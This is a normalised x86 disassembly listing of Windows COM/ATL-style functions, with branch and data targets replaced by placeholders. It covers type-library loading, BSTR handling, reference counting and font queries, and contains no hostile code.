mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_417440
push esi
push edi
mov edi [ esp + 0xc ]
test edi edi
je r-xdata
xor esi esi
lea esi [ edi - 0x38 ]
jmp r-xdata
mov eax [ edi + 0x4 ]
xor esi esi
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push ebx
mov ebx [ esp + 0x14 ]
cmp [ esi + 0x3c ] ebx
je r-xdata
test ebx ebx
pop ebx
jne r-xdata
mov ecx [ eax ]
lea edx [ edi + 0xa4 ]
push edx
push r--data
push eax
mov eax [ ecx ]
call eax
mov esi eax
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
mov eax [ ebx ]
mov ecx [ eax + 0x4 ]
push ebx
call ecx
pop edi
mov eax esi
pop esi
retn 0x8
mov eax [ edi + 0xa4 ]
test eax eax
je r-xdata
mov [ esi + 0x3c ] ebx
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov [ edi + 0xa4 ] 0x0
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_4174c0
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
xor edx edx
lea edx [ eax - 0x38 ]
jmp r-xdata
retn 0xc
mov eax [ edx + 0x3c ]
test eax eax
je r-xdata
mov ecx [ esp + 0xc ]
mov eax 0x80004003
test ecx ecx
je r-xdata
mov [ ecx ] 0x0
mov eax 0x80004005
mov edx [ eax ]
mov [ esp + 0xc ] ecx
mov [ esp + 0x4 ] eax
mov edx [ edx ]
jmp edx
sub_417610
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x80 ]
mov ecx [ ecx + 0x34 ]
shr eax 0x5
and eax 0x1
mov [ esp + 0x4 ] eax
test ecx ecx
je r-xdata
retn 0x14
mov edx [ ecx ]
push esi
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x1c ]
push eax
mov eax [ esp + 0x1c ]
push eax
mov eax [ esp + 0x1c ]
mov esi [ eax + 0x4 ]
mov eax [ eax ]
push esi
push eax
mov eax [ esp + 0x20 ]
push eax
push ecx
mov ecx [ edx + 0x1c ]
call ecx
mov eax [ esp + 0x8 ]
pop esi
sub_417660
mov ecx [ esp + 0x8 ]
test ecx ecx
jne r-xdata
mov edx [ esp + 0x4 ]
mov eax [ edx + 0x34 ]
test eax eax
je r-xdata
mov eax 0x80004003
retn 0x8
mov eax [ edx + 0x98 ]
mov [ ecx + 0x4 ] eax
mov edx [ edx + 0x9c ]
mov [ ecx + 0x8 ] edx
xor eax eax
retn 0x8
mov edx [ eax ]
push esi
lea esi [ ecx + 0x8 ]
push esi
add ecx 0x4
push ecx
push eax
mov eax [ edx + 0x20 ]
call eax
pop esi
retn 0x8
sub_4176b0
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x80 ]
mov ecx [ ecx + 0x34 ]
shr eax 0x6
and eax 0x1
mov [ esp + 0x4 ] eax
test ecx ecx
je r-xdata
retn 0x18
mov eax [ ecx ]
mov eax [ eax + 0x24 ]
lea edx [ esp + 0x4 ]
push edx
mov edx [ esp + 0x1c ]
push edx
mov edx [ esp + 0x1c ]
push edx
mov edx [ esp + 0x1c ]
push edx
mov edx [ esp + 0x1c ]
push edx
mov edx [ esp + 0x1c ]
push edx
push ecx
call eax
mov eax [ esp + 0x4 ]
sub_417740
mov ecx [ esp + 0x4 ]
mov ecx [ ecx + 0x34 ]
xor eax eax
test ecx ecx
je r-xdata
retn 0x8
mov eax [ esp + 0x8 ]
mov edx [ ecx ]
neg eax
sbb eax eax
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] ecx
mov ecx [ edx + 0x30 ]
jmp ecx
sub_417770
mov ecx [ esp + 0x4 ]
mov ecx [ ecx + 0x34 ]
xor eax eax
test ecx ecx
je r-xdata
retn 0x8
mov eax [ esp + 0x8 ]
mov edx [ ecx ]
neg eax
sbb eax eax
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] ecx
mov ecx [ edx + 0x34 ]
jmp ecx
sub_4177a0
mov ecx [ esp + 0x4 ]
mov ecx [ ecx + 0x34 ]
xor eax eax
test ecx ecx
je r-xdata
retn 0x8
mov eax [ esp + 0x8 ]
mov edx [ ecx ]
neg eax
sbb eax eax
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] ecx
mov ecx [ edx + 0x38 ]
jmp ecx
sub_4177d0
mov ecx [ esp + 0x4 ]
mov ecx [ ecx + 0x34 ]
xor eax eax
test ecx ecx
je r-xdata
retn 0x10
mov eax [ esp + 0x10 ]
mov edx [ ecx ]
push esi
neg eax
sbb eax eax
push eax
mov eax [ esp + 0x14 ]
push eax
mov eax [ esp + 0x14 ]
mov esi [ eax + 0xc ]
push esi
mov esi [ eax + 0x8 ]
push esi
mov esi [ eax + 0x4 ]
mov eax [ eax ]
push esi
push eax
push ecx
mov ecx [ edx + 0x3c ]
call ecx
pop esi
sub_417810
sub esp 0x84
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x80 ] eax
mov eax [ esp + 0x88 ]
push 0x40
lea ecx [ esp + 0x4 ]
push ecx
push eax
call [ StringFromGUID2@IAT ]
lea edx [ esp ]
push edx
call [ SysAllocString@IAT ]
mov [ esi ] eax
test eax eax
jne r-xdata
mov ecx [ esp + 0x80 ]
xor ecx esp
mov eax esi
call sub_43f96b
add esp 0x84
retn 0x4
push 0x8007000e
call sub_427e00
sub_417870
push ecx
mov ecx [ esp + 0x8 ]
push edi
mov edi [ ecx + 0x34 ]
mov eax 0x1
mov [ esp + 0x4 ] eax
test edi edi
je r-xdata
pop edi
pop ecx
retn 0x10
mov edx [ esp + 0x14 ]
push esi
push edx
lea esi [ esp + 0x14 ]
call sub_417810
mov eax [ eax ]
mov ecx [ edi ]
mov ecx [ ecx + 0x40 ]
lea edx [ esp + 0x8 ]
push edx
mov edx [ esp + 0x20 ]
push edx
push eax
mov eax [ esp + 0x20 ]
mov edx [ eax + 0xc ]
push edx
mov edx [ eax + 0x8 ]
push edx
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push edx
push eax
push edi
call ecx
mov edx [ esp + 0x10 ]
push edx
call [ SysFreeString@IAT ]
mov eax [ esp + 0x8 ]
pop esi
sub_4178e0
push ebp
mov ebp [ esp + 0xc ]
push esi
mov esi 0x1
test ebp ebp
jne r-xdata
push ebx
mov ebx [ esp + 0x10 ]
mov [ ebp ] 0x0
mov eax [ ebx + 0x34 ]
push edi
test eax eax
je r-xdata
pop esi
mov eax 0x80004003
pop ebp
retn 0xc
mov ecx [ ebx + 0xa0 ]
push ecx
call [ SysStringLen@IAT ]
test eax eax
je r-xdata
mov edx [ esp + 0x1c ]
mov ecx [ eax ]
push edx
push ebp
push eax
mov eax [ ecx + 0x44 ]
call eax
mov esi eax
test esi esi
jl r-xdata
pop edi
pop ebx
mov eax esi
pop esi
pop ebp
retn 0xc
mov eax [ ebx + 0xa0 ]
push eax
call [ lstrlenW@IAT ]
mov esi eax
inc esi
lea edx [ esi + esi ]
push edx
call [ CoTaskMemAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop edi
mov esi 0x1
pop ebx
mov eax esi
pop esi
pop ebp
retn 0xc
cmp [ ebp ] 0x0
jne r-xdata
push esi
mov esi [ ebx + 0xa0 ]
push edi
call sub_41a3d0
add esp 0x8
test al al
jne r-xdata
pop edi
pop ebx
pop esi
mov eax 0x8007000e
pop ebp
retn 0xc
mov [ ebp ] edi
xor esi esi
pop edi
pop ebx
pop esi
mov eax 0x80004005
pop ebp
retn 0xc
sub_4179a0
push edi
mov edi [ esp + 0x10 ]
test edi edi
jne r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] 0x0
mov eax [ eax + 0x34 ]
push esi
mov esi 0x80004001
test eax eax
je r-xdata
mov eax 0x80004003
pop edi
retn 0xc
mov eax esi
pop esi
pop edi
retn 0xc
lea edx [ esp + 0x14 ]
push edx
mov edx [ esp + 0x14 ]
mov [ esp + 0x18 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x48 ]
call eax
test eax eax
mov eax [ esp + 0x14 ]
jl r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ eax ]
mov edx [ ecx ]
push edi
push r--data
push eax
call edx
mov esi eax
test esi esi
jl r-xdata
mov esi 0x80004001
cmp [ edi ] 0x0
jne r-xdata
mov eax [ esp + 0x14 ]
sub_417a30
push esi
mov esi [ esp + 0xc ]
test esi esi
jne r-xdata
mov ecx [ esp + 0x8 ]
mov [ esi ] 0x0
mov eax [ ecx + 0x34 ]
test eax eax
je r-xdata
mov eax 0x80004003
pop esi
retn 0x8
mov eax [ ecx + 0x30 ]
mov [ esi ] eax
mov ecx [ ecx + 0x30 ]
test ecx ecx
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x4c ]
push esi
push eax
call edx
test eax eax
jl r-xdata
xor eax eax
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
push ecx
call eax
mov eax 0x80004002
pop esi
retn 0x8
cmp [ esi ] 0x0
jne r-xdata
pop esi
retn 0x8
sub_417a90
push ebp
mov ebp [ esp + 0x14 ]
push esi
xor esi esi
cmp ebp esi
jne r-xdata
mov eax [ esp + 0xc ]
push ebx
push edi
mov [ ebp ] esi
mov edi [ eax + 0x34 ]
mov ebx 0x1
cmp edi esi
je r-xdata
pop esi
mov eax 0x80004003
pop ebp
retn 0x10
pop edi
mov eax ebx
pop ebx
pop esi
pop ebp
retn 0x10
mov eax [ esp + 0x1c ]
mov [ esp + 0x20 ] esi
cmp eax esi
je r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ edi ]
mov ecx [ ecx + 0x50 ]
lea edx [ esp + 0x20 ]
push edx
push esi
push eax
push edi
call ecx
mov edi [ SysFreeString@IAT ]
push esi
mov ebx eax
call edi
test ebx ebx
jl r-xdata
push eax
call [ SysAllocString@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov edx [ esp + 0x20 ]
push edx
mov ebx 0x1
call edi
mov edx [ esp + 0x20 ]
mov esi [ SysStringLen@IAT ]
push edx
call esi
test eax eax
je r-xdata
push 0x8007000e
call sub_427e00
mov eax [ esp + 0x20 ]
push eax
call esi
lea esi [ eax + eax + 0x2 ]
push esi
call [ CoTaskMemAlloc@IAT ]
mov ecx [ esp + 0x20 ]
mov [ ebp ] eax
test eax eax
jne r-xdata
push eax
mov eax esi
mov edx esi
call sub_41a8e0
mov edx [ esp + 0x24 ]
add esp 0x4
push edx
call edi
pop edi
mov eax ebx
pop ebx
pop esi
pop ebp
retn 0x10
push ecx
call edi
pop edi
pop ebx
pop esi
mov eax 0x8007000e
pop ebp
retn 0x10
sub_417b80
push edi
mov edi [ esp + 0x10 ]
test edi edi
jne r-xdata
push ebx
mov ebx [ esp + 0xc ]
mov [ edi ] 0x0
mov eax [ ebx + 0x34 ]
push esi
mov esi 0x1
test eax eax
je r-xdata
mov eax 0x80004003
pop edi
retn 0xc
mov eax esi
pop esi
pop ebx
pop edi
retn 0xc
lea edx [ esp + 0x18 ]
push edx
mov edx [ esp + 0x18 ]
mov [ esp + 0x1c ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
mov esi eax
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
test esi esi
jl r-xdata
mov ecx [ ebx - 0x24 ]
mov edx [ ecx ]
lea eax [ ebx - 0x24 ]
push edi
push r--data
push eax
call edx
mov esi eax
mov eax [ esp + 0x18 ]
mov esi 0x1
cmp [ edi ] 0x0
jne r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
test eax eax
je r-xdata
sub_417cc0
cmp [ esp + 0x8 ] 0x0
je r-xdata
push esi
mov esi [ esp + 0x14 ]
test esi esi
jne r-xdata
mov eax 0x8002000b
retn 0x10
xor eax eax
cmp [ rw-data ] eax
jne r-xdata
mov eax 0x80004003
pop esi
retn 0x10
mov ecx [ rw-data ]
mov [ esi ] ecx
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x10 ]
push eax
call sub_418230
pop esi
retn 0x10
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
push ecx
call eax
xor eax eax
sub_417d20
xor eax eax
cmp [ rw-data ] eax
je r-xdata
mov eax [ esp + 0x8 ]
push eax
call sub_418230
cmp [ rw-data ] eax
jne r-xdata
retn 0xc
cmp [ rw-data ] 0x0
push ebp
push esi
push edi
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ esp + 0x18 ]
mov eax [ rw-data ]
mov ecx [ eax ]
push edx
mov edx [ esp + 0x14 ]
push edx
push ebx
push eax
mov eax [ ecx + 0x28 ]
call eax
pop edi
pop esi
pop ebp
cmp [ esp + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx ]
push eax
call [ lstrlenW@IAT ]
mov edi [ rw-data ]
add edi 0xffffffff
mov [ esp + 0x14 ] eax
js r-xdata
mov edx [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ebp [ edx + ecx * 4 + 0x4 ]
lea esp [ esp ]
dec edi
sub ebp 0xc
test edi edi
jge r-xdata
mov edx [ ebx ]
mov esi [ ebp - 0x4 ]
add ecx ecx
cmp ecx 0x4
jb r-xdata
mov ecx [ ebp ]
cmp [ esp + 0x14 ] ecx
jne r-xdata
test ecx ecx
je r-xdata
mov eax [ esi ]
cmp eax [ edx ]
jne r-xdata
mov eax [ rw-data ]
lea edx [ edi + edi * 2 ]
mov ecx [ eax + edx * 4 + 0x8 ]
mov edx [ esp + 0x18 ]
pop edi
pop esi
mov [ edx ] ecx
xor eax eax
pop ebp
retn 0xc
mov al [ edx ]
cmp al [ esi ]
jne r-xdata
sub ecx 0x4
add edx 0x4
add esi 0x4
cmp ecx 0x4
jae r-xdata
cmp ecx 0x1
jbe r-xdata
mov al [ edx + 0x1 ]
cmp al [ esi + 0x1 ]
jne r-xdata
cmp ecx 0x2
jbe r-xdata
mov cl [ edx + 0x2 ]
cmp cl [ esi + 0x2 ]
je r-xdata
sub_417e40
mov eax [ eax ]
sub esp 0x8
test eax eax
jne r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
xor al al
add esp 0x8
retn
push ebx
lea edx [ esp + 0x4 ]
push edx
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xc ] 0x0
mov ecx [ eax ]
push r--data
push eax
mov eax [ ecx ]
call eax
mov ecx [ esi ]
mov eax [ ecx ]
lea edx [ esp + 0x8 ]
push edx
push r--data
push esi
call eax
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
cmp ecx eax
sete bl
test eax eax
je r-xdata
mov al 0x1
add esp 0x8
retn
test ecx ecx
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ esp + 0x4 ]
mov al bl
pop ebx
add esp 0x8
retn
mov eax [ ecx ]
push ecx
mov ecx [ eax + 0x8 ]
call ecx
sub_417ec0
push esi
mov esi [ ebx ]
mov eax edi
call sub_417e40
test al al
jne r-xdata
mov eax [ edi ]
pop esi
retn
mov eax [ ebx ]
test edi edi
jne r-xdata
mov esi [ edi ]
mov [ edi ] 0x0
test eax eax
je r-xdata
xor eax eax
pop esi
retn
test esi esi
je r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push edi
push r--data
push eax
call edx
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
push esi
call ecx
sub_417f10
push ebp
mov ebp esp
push 0xffffffff
push sub_458f20
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
test ebx ebx
jne r-xdata
push 0xc
mov [ ebp - 0x4 ] 0x0
call sub_43fa1d
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
mov eax 0x80070057
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edi [ ebx + 0xc ]
push edi
mov [ esi ] sub_417fe0
mov [ esi + 0x4 ] rw-data
call [ EnterCriticalSection@IAT ]
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
push edi
mov [ ebp - 0x14 ] 0x0
mov [ ebx + 0x8 ] esi
call [ LeaveCriticalSection@IAT ]
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax 0x8007000e
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417fe0
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn 0x4
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
mov [ esi + 0xc ] 0x0
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ esi + 0x14 ] 0x0
mov ecx [ eax - 0x4 ]
push edi
lea edi [ eax - 0x4 ]
push sub_418030
push ecx
push 0xc
push eax
call sub_441e2b
push edi
call sub_43f97a
add esp 0x4
pop edi
sub_418060
push ebp
mov ebp esp
push 0xffffffff
push sub_458f03
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx [ ebp + 0x8 ]
mov eax [ ebx ]
mov edx [ eax + 0xc ]
lea ecx [ ebp - 0x1c ]
push ecx
push ebx
call edx
xor edi edi
cmp eax edi
jl r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x1c ]
movzx eax [ eax + 0x2c ]
mov [ ebp - 0x18 ] edi
mov [ rw-data ] eax
mov [ rw-data ] edi
cmp eax edi
je r-xdata
cmp eax edi
mov [ ebp - 0x20 ] edi
jle r-xdata
mov esi eax
xor ecx ecx
mov edx 0xc
mul edx
seto cl
mov [ ebp - 0x4 ] edi
neg ecx
or ecx eax
xor eax eax
add ecx 0x4
setb al
neg eax
or eax ecx
push eax
call sub_43f0ce
add esp 0x4
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
mov [ rw-data ] ecx
mov edx [ ebx ]
mov ecx [ edx + 0x4c ]
push eax
push ebx
call ecx
mov esi [ ebp - 0x18 ]
xor edi edi
push sub_418030
push sub_418040
push esi
lea edi [ eax + 0x4 ]
push 0xc
push edi
mov [ eax ] esi
call sub_441d68
jmp r-xdata
inc edi
add esi 0xc
cmp edi [ rw-data ]
mov [ ebp - 0x20 ] edi
jl r-xdata
mov [ ebp + 0x8 ] 0x0
push 0x0
push 0x0
mov [ ebp - 0x4 ] 0x3
mov eax [ ebp - 0x14 ]
mov ecx [ ebx ]
push 0x0
lea edx [ ebp + 0x8 ]
push edx
mov edx [ eax ]
mov eax [ ecx + 0x30 ]
push edx
push ebx
call eax
test eax eax
jl r-xdata
mov edx [ ebp - 0x1c ]
mov ecx [ ebx ]
mov eax [ ecx + 0x4c ]
push edx
push ebx
call eax
mov eax 0x8007000e
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ rw-data ]
xor edi edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x4 ] 0xffffffff
test edi edi
je r-xdata
mov ecx [ ebx ]
mov eax [ ecx + 0x14 ]
lea edx [ ebp - 0x14 ]
push edx
push edi
push ebx
call eax
test eax eax
jl r-xdata
mov ecx [ ebp - 0x14 ]
mov eax [ ebx ]
mov edx [ eax + 0x50 ]
push ecx
push ebx
call edx
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
push eax
call [ SysFreeString@IAT ]
mov edi [ ebp + 0x8 ]
mov eax [ esi ]
mov [ ebp + 0x8 ] 0x0
cmp eax edi
je r-xdata
mov eax [ esi ]
push eax
call [ SysStringLen@IAT ]
mov ecx [ ebp - 0x14 ]
mov edi [ ebp - 0x20 ]
mov [ esi + 0x4 ] eax
mov edx [ ecx ]
mov [ esi + 0x8 ] edx
push eax
call [ SysFreeString@IAT ]
mov [ esi ] edi
sub_418230
push 0xffffffff
push sub_4596cc
mov eax [ fs : 0x0 ]
push eax
sub esp 0x224
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x220 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x238 ]
mov [ fs : 0x0 ] eax
xor ebx ebx
cmp [ rw-data ] ebx
je r-xdata
mov esi [ rw-data ]
add esi 0x10
mov [ esp + 0x24 ] esi
push esi
mov [ esp + 0x244 ] ebx
call [ EnterCriticalSection@IAT ]
mov [ esp + 0x28 ] 0x1
mov ebp 0x80004005
cmp [ rw-data ] ebx
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
xor ebp ebp
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov dx [ rw-data ]
mov [ esp + 0x1c ] ebx
cmp ecx [ eax ]
mov cx [ rw-data ]
jne r-xdata
xor eax eax
jmp r-xdata
push esi
call [ LeaveCriticalSection@IAT ]
mov eax ebp
cmp [ rw-data ] ebx
jne r-xdata
lea edi [ esp + 0x1c ]
push edi
mov edi [ esp + 0x24c ]
push edi
movzx ecx cx
movzx edx dx
push ecx
push edx
push eax
call [ LoadRegTypeLib@IAT ]
mov ebp eax
mov edi [ rw-data ]
cmp edi [ eax + 0x4 ]
jne r-xdata
mov ecx [ esp + 0x238 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x220 ]
xor ecx esp
call sub_43f96b
add esp 0x230
retn 0x4
push eax
call sub_418060
mov ebp eax
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov [ esp + 0x18 ] ebx
mov [ esp + 0x240 ] 0x1
mov eax [ esp + 0x1c ]
mov ecx [ eax ]
lea edx [ esp + 0x18 ]
push edx
mov edx [ rw-data ]
push edx
push eax
mov eax [ ecx + 0x18 ]
call eax
mov ebp eax
cmp ebp ebx
jl r-xdata
mov edi [ rw-data ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ esp + 0x240 ] bl
mov eax [ esp + 0x18 ]
cmp eax ebx
je r-xdata
mov eax [ esp + 0x18 ]
mov [ esp + 0x20 ] eax
cmp eax ebx
je r-xdata
mov edi [ rw-data ]
cmp edi [ eax + 0xc ]
jne r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
jmp r-xdata
mov [ esp + 0x14 ] ebx
lea edx [ esp + 0x14 ]
push edx
mov [ esp + 0x244 ] 0x3
mov ecx [ eax ]
push r--data
push eax
mov eax [ ecx ]
call eax
test eax eax
jl r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
push eax
call edx
mov eax [ esp + 0x18 ]
mov edi 0xffff
cmp dx di
jne r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ rw-data ]
mov [ esp + 0x20 ] ebx
mov [ rw-data ] eax
cmp ecx ebx
je r-xdata
lea ebx [ esp + 0x14 ]
lea edi [ esp + 0x20 ]
call sub_417ec0
xor ebx ebx
cmp cx di
jne r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
mov eax [ rw-data ]
push 0x104
lea edx [ esp + 0x30 ]
push edx
push eax
call [ GetModuleFileNameW@IAT ]
cmp eax ebx
je r-xdata
mov [ esp + 0x240 ] 0x1
mov eax [ esp + 0x20 ]
cmp eax ebx
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call sub_417f10
mov [ esp + 0x240 ] 0x2
mov eax [ esp + 0x14 ]
cmp eax ebx
je r-xdata
cmp eax 0x104
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
lea ecx [ esp + 0x1c ]
push ecx
lea edx [ esp + 0x30 ]
push edx
mov [ esp + 0x1c ] ebx
call [ LoadTypeLib@IAT ]
lea esi [ esp + 0x14 ]
mov ebp eax
call sub_41aed0
mov esi [ esp + 0x24 ]
jmp r-xdata
cmp ebp ebx
jl r-xdata
sub_4184c0
mov ecx [ rw-data ]
xor eax eax
test ecx ecx
je r-xdata
mov eax [ esp + 0x10 ]
push eax
call sub_418230
mov ecx [ rw-data ]
cmp [ rw-data ] eax
jne r-xdata
cmp eax 0x80020003
je r-xdata
mov eax [ esp + 0x2c ]
mov edx [ ecx ]
push edi
push ebp
push eax
mov eax [ esp + 0x34 ]
push eax
mov eax [ esp + 0x24 ]
push ebx
push esi
push eax
push ecx
mov ecx [ edx + 0x2c ]
call ecx
push ebx
mov ebx [ esp + 0x18 ]
push ebp
mov ebp [ esp + 0x28 ]
push esi
mov esi [ esp + 0x14 ]
push edi
mov edi [ esp + 0x34 ]
test ecx ecx
je r-xdata
mov edx [ esp + 0x14 ]
mov ecx [ edx + 0x8 ]
test ecx ecx
je r-xdata
cmp eax 0x8002802b
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn 0x24
mov edx [ esp + 0x2c ]
mov eax [ ecx ]
mov eax [ eax + 0x18 ]
push edi
push ebp
push edx
mov edx [ esp + 0x34 ]
push edx
mov edx [ esp + 0x30 ]
push ebx
push edx
mov edx [ esp + 0x34 ]
push edx
push esi
push ecx
call eax
test eax eax
jl r-xdata
test bl 0x4
je r-xdata
mov ecx [ esp + 0x14 ]
push esi
add ecx 0xffffffb4
push ecx
call sub_418a60
sub_418590
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ ecx + 0x7c ]
and dl 0x1
movzx ecx dl
neg ecx
sbb ecx ecx
mov [ eax ] cx
xor eax eax
retn 0x8
mov eax 0x80004003
retn 0x8
sub_4185e0
mov eax [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
push 0xfffffd43
lea ecx [ esi - 0x4c ]
push ecx
mov [ esi + 0x80 ] eax
call sub_418a60
mov edx [ esi - 0x20 ]
push 0x0
lea eax [ esi - 0x20 ]
push 0x0
push eax
mov eax [ edx + 0x64 ]
call eax
xor eax eax
pop esi
retn 0x8
sub_418740
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ ecx + 0x7c ]
and dl 0x2
movzx ecx dl
neg ecx
sbb ecx ecx
mov [ eax ] cx
xor eax eax
retn 0x8
mov eax 0x80004003
retn 0x8
sub_418770
movsx ecx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
add ecx ecx
add ecx ecx
xor ecx [ eax + 0x7c ]
push 0xfffffd37
and ecx 0x4
xor [ eax + 0x7c ] ecx
add eax 0xffffffb4
push eax
call sub_418a60
xor eax eax
retn 0x8
sub_4187a0
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ ecx + 0x7c ]
and dl 0x4
movzx ecx dl
neg ecx
sbb ecx ecx
mov [ eax ] cx
xor eax eax
retn 0x8
mov eax 0x80004003
retn 0x8
sub_4187d0
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
cmp [ esi + 0x8c ] edi
je r-xdata
push 0xfffffd41
add esi 0xffffffb4
push esi
call sub_418a60
pop edi
xor eax eax
pop esi
retn 0x8
test edi edi
je r-xdata
mov eax [ esi + 0x8c ]
test eax eax
je r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
push edi
call ecx
mov [ esi + 0x8c ] edi
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
sub_418820
sub esp 0x8c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x88 ] eax
mov eax [ esp + 0x94 ]
push ebp
mov ebp [ esp + 0x94 ]
mov [ esp + 0xc ] eax
test eax eax
jne r-xdata
push ebx
lea ebx [ ebp + 0x8c ]
push esi
mov [ eax ] 0x0
cmp [ ebx ] 0x0
push edi
jne r-xdata
mov eax 0x80004003
pop ebp
mov ecx [ esp + 0x88 ]
xor ecx esp
call sub_43f96b
add esp 0x8c
retn 0x8
mov ecx [ ebx ]
mov [ eax ] ecx
mov eax [ ebx ]
test eax eax
je r-xdata
mov esi [ GetStockObject@IAT ]
push 0x11
mov [ esp + 0x14 ] 0x0
call esi
test eax eax
jne r-xdata
xor eax eax
mov edx [ eax ]
push eax
mov eax [ edx + 0x4 ]
call eax
lea ecx [ esp + 0x3c ]
push ecx
push 0x5c
push eax
call [ GetObjectW@IAT ]
mov ax [ esp + 0x4c ]
movzx cx [ esp + 0x53 ]
mov [ esp + 0x2c ] ax
movzx eax [ esp + 0x51 ]
lea edx [ esp + 0x58 ]
mov [ esp + 0x20 ] edx
movzx edx [ esp + 0x50 ]
mov [ esp + 0x2e ] cx
movzx ecx [ esp + 0x52 ]
mov [ esp + 0x34 ] eax
mov eax [ esp + 0x3c ]
mov [ esp + 0x1c ] 0x20
mov [ esp + 0x30 ] edx
